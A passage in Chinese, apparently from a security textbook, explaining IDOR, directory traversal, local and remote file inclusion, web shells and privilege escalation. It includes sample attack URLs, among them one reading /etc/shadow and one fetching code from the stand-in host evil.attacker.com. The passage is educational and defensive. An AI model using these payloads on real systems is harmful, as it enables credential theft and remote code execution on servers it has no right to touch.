
用户访问此链接会在 `mycompany.com` 网站上完成合法交易，但随后会被重定向到攻击者的页面，其中的代码可能会将用户直接引入会话窃取或凭证盗窃攻击。

寻求在其应用程序中包含重定向选项的开发人员应执行*验证过的重定向*，即根据批准列表检查重定向 URL。此列表可能指定授权重定向的确切 URL，或者更简单地说，它可能仅将重定向限制为来自同一域的 URL。

## 利用授权漏洞

我们已经探讨了允许攻击者向后端系统发送代码的注入漏洞，以及允许攻击者假冒合法用户身份的身份验证漏洞。现在让我们看看一些授权漏洞，它们允许攻击者超出其被授权的访问级别。

### 不安全的直接对象引用

在某些情况下，Web 开发人员设计应用程序时，会根据用户在查询字符串或 `POST` 请求中提供的参数，直接从数据库检索信息。例如，此查询字符串可用于从文档管理系统检索文档：

```
https://www.mycompany.com/getDocument.php?documentID=1842
```

只要应用程序还实现了其他授权机制，这种方法本身没有任何问题。应用程序仍有责任确保用户经过适当身份验证，并被授权访问请求的文档。

原因在于攻击者可以轻松查看此 URL，然后对其进行修改，以尝试检索其他文档，例如：

```
https://www.mycompany.com/getDocument.php?documentID=1841
https://www.mycompany.com/getDocument.php?documentID=1843
https://www.mycompany.com/getDocument.php?documentID=1844
```

如果应用程序不执行授权检查，用户可能会被允许查看超出其权限的信息。这种情况称为*不安全的直接对象引用*。

### 目录遍历

某些 Web 服务器存在安全配置错误，允许用户浏览目录结构并访问本应保持安全的文件。当 Web 服务器允许包含浏览目录路径的操作符，且文件系统访问控制未能正确限制对存储在服务器其他位置的文件的访问时，这些*目录遍历*攻击就会生效。

例如，考虑一个将 Web 内容存储在目录路径 `/var/www/html/` 中的 Apache Web 服务器。同一台服务器可能将包含哈希用户密码的 shadow 密码文件存储在 `/etc` 目录中，文件名为 `/etc/shadow`。这两个位置通过相同的目录结构链接，如[图 6.15](#c06.xhtml#c06-fig-0015)所示。

![图 6.15 Web 服务器目录结构示例](images/c06f015.png)

[**图 6.15**](#c06.xhtml#R_c06-fig-0015) Web 服务器目录结构示例

如果 Apache 服务器使用 `/var/www/html/` 作为网站的根位置，则这是所有文件的假定路径，除非另有指定。例如，如果站点是 `www.mycompany.com`，则 URL `www.mycompany.com/account.php` 将引用存储在服务器上的文件 `/var/www/html/account.php`。

在 Linux 操作系统中，文件路径中的 `..` 操作符指代比当前目录高一级的目录。例如，路径 `/var/www/html/../` 指代比 `html` 目录高一级的目录，即 `/var/www/`。

目录遍历攻击利用此知识，尝试导航到 Web 服务器保留区域之外的文件系统区域。例如，目录遍历攻击可能尝试通过输入此 URL 来访问 shadow 密码文件：

```
http://www.mycompany.com/../../../etc/shadow
```

如果攻击成功，Web 服务器将忠实地在攻击者的浏览器中显示 shadow 密码文件，为针对凭证的暴力破解攻击提供起点。攻击 URL 使用 `..` 操作符三次以向上导航目录层次结构。如果您参考[图 6.15](#c06.xhtml#c06-fig-0015)并以 `/var/www/html` 目录作为起点，第一个 `..` 操作符将您带到 `/var/www`，第二个带到 `/var`，第三个带到根目录 `/`。URL 的其余部分将您带入 `/etc/` 目录并到达 `/etc/shadow` 文件的位置。

### 文件包含

*文件包含攻击*将目录遍历提升到了一个新的层次。文件包含攻击不仅仅是从本地操作系统检索文件并将其显示给攻击者，而是实际执行文件中包含的代码，从而欺骗 Web 服务器执行任意代码。

文件包含攻击有两种变体：

*   *本地文件包含*攻击旨在执行位于 Web 服务器其他位置的文件中存储的代码。它们的工作方式与目录遍历攻击非常相似。例如，攻击者可能使用以下 URL 来执行存储在 Windows 服务器 `C:\www\uploads` 目录中名为 `attack.exe` 的文件：

    ```
    http://www.mycompany.com/app.php?include=C:\\www\\uploads\\attack.exe
    ```

*   *远程文件包含*攻击允许攻击者更进一步，执行存储在远程服务器上的代码。这些攻击特别危险，因为攻击者可以直接控制所执行的代码，而无需先在本地服务器上存储文件。例如，攻击者可能使用此 URL 来执行存储在远程服务器上的攻击文件：

    ```
    http://www.mycompany.com/app.php?include=http://evil.attacker.com/attack.exe
    ```

当攻击者发现文件包含漏洞时，他们通常会利用它将 *Web Shell* 上传到服务器。Web Shell 允许攻击者在服务器上执行命令并在浏览器中查看结果。这种方法通过常用的 HTTP 和 HTTPS 端口为攻击者提供了对服务器的访问，使其流量不太容易被安全工具检测到。此外，攻击者甚至可能会修复他们用于获取服务器访问权限的初始漏洞，以防止其被寻求控制服务器的其他攻击者或可能因此而察觉到成功攻击的安全团队发现。

### 权限提升

*权限提升*攻击旨在增加攻击者对目标系统的访问级别。它们利用允许将普通用户账户转换为更具特权账户（如 root 超级用户账户）的漏洞。

2016 年 10 月，安全研究人员宣布发现了一个被称为 Dirty COW 的 Linux 内核漏洞。该漏洞在 Linux 内核中存在了九年，极易被利用，并赋予成功的攻击者对受影响系统的管理控制权。

## 利用 Web 应用程序漏洞

Web 应用程序是由应用程序代码、Web 平台、操作系统、数据库和相互连接的*应用程序编程接口 (API)* 组成的复杂生态系统。这些环境的复杂性使多种不同类型的攻击成为可能，并为渗透测试人员提供了肥沃的土壤。我们已经研究了针对 Web 应用程序的各种攻击，包括注入攻击、会话劫持、目录遍历等。在以下部分中，我们将通过探索跨站脚本、跨站请求伪造和点击劫持，来完善我们对基于 Web 的漏洞利用的了解。

### 跨站脚本 (XSS)
